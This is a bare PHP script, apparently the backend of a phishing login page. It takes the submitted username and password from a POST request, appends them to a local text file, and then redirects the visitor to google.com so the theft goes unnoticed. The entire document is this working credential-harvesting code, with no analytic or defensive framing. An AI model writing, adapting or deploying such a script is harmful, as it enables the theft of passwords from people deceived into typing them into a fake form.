<?php
$username = $_POST['username'];
$password = $_POST['password'];
$fp = fopen('abc.txt','a');
fwrite ($fp, $username);
fwrite ($fp, $password);
fclose($fp);
header("Location: https://www.google.com");
?>